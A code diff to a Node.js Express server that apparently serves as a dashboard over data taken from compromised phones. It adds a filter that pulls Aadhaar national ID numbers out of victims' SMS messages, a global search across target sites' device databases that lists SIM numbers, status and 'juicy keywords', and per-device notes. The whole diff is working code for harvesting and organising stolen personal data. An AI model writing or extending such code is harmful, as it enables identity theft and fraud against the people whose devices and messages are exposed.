@@ -325,6 +325,7 @@ app.get('/api/url/:id/device/:deviceId/searchaadhar', async (req, res) => {
 
     // 12-digit Aadhaar: must not be preceded/followed by another digit
     const AADHAR_RE = /(?<!\d)([2-9]\d{11})(?!\d)/g;
+    const AADHAR_KW = /aadhaar|aadhar/i;
 
     function* iterMsgs(data) {
       if (typeof data !== 'object' || !data) return;
@@ -341,7 +342,11 @@ app.get('/api/url/:id/device/:deviceId/searchaadhar', async (req, res) => {
       const body = String(msg.body || msg.message || msg.msg || msg.text || '');
       if (!body) continue;
       const aadhars = [...new Set([...body.matchAll(AADHAR_RE)].map(m => m[1]))];
-      if (aadhars.length) hits.push({ body, aadhars });
+      const hasKeyword = AADHAR_KW.test(body);
+      // Include ONLY if BOTH: has 12-digit number AND contains "aadhaar" keyword
+      if (aadhars.length && hasKeyword) {
+        hits.push({ body, aadhars, hasKeyword });
+      }
       if (hits.length >= 100) break;
     }
 
@@ -349,6 +354,61 @@ app.get('/api/url/:id/device/:deviceId/searchaadhar', async (req, res) => {
   } catch (e) {
     res.json({ hits: [], total: 0, error: e.message });
   }
+});
+
+// ── Global device search across all URLs ─────────────────────────────────────
+app.get('/api/search/device/:deviceId', (req, res) => {
+  const q = req.params.deviceId.toLowerCase().trim();
+  const results = [];
+  for (const target of TARGETS) {
+    const db = loadDb(target.id);
+    for (const [deviceId, dev] of Object.entries(db)) {
+      if (deviceId.toLowerCase().includes(q)) {
+        results.push({
+          urlId:      target.id,
+          url:        target.url,
+          schema:     target.schema,
+          deviceId,
+          brand:      dev.brand || 'Unknown',
+          status:     dev.current_status || 'offline',
+          battery:    dev.last_battery || 'N/A',
+          sim1:       dev.sim1_number || 'N/A',
+          sim2:       dev.sim2_number || 'N/A',
+          lastActivity: dev.last_activity || null,
+          juicyKeywords: dev.juicy_keywords || [],
+          smsLink:    getSmsLink(target, deviceId, dev.obj_id),
+        });
+      }
+    }
+  }
+  res.json({ results, total: results.length });
+});
+
+// ── Device Notes: save/load text notes per device (stored in notes.json) ──────
+const NOTES_FILE = path.join(BOT_DIR, 'device_notes.json');
+
+function loadNotes() {
+  try { if (fs.existsSync(NOTES_FILE)) return JSON.parse(fs.readFileSync(NOTES_FILE, 'utf8')); }
+  catch {}
+  return {};
+}
+function saveNotes(notes) {
+  try { fs.writeFileSync(NOTES_FILE, JSON.stringify(notes, null, 2)); }
+  catch (e) { console.error('Notes save error:', e.message); }
+}
+
+app.get('/api/notes/:urlId/:deviceId', (req, res) => {
+  const key = `${req.params.urlId}:${req.params.deviceId}`;
+  const notes = loadNotes();
+  res.json({ note: notes[key] || '' });
+});
+
+app.post('/api/notes/:urlId/:deviceId', express.json(), (req, res) => {
+  const key = `${req.params.urlId}:${req.params.deviceId}`;
+  const notes = loadNotes();
+  notes[key] = req.body.note || '';
+  saveNotes(notes);
+  res.json({ ok: true });
 });
 
 // ── Serve frontend ────────────────────────────────────────────────────────────
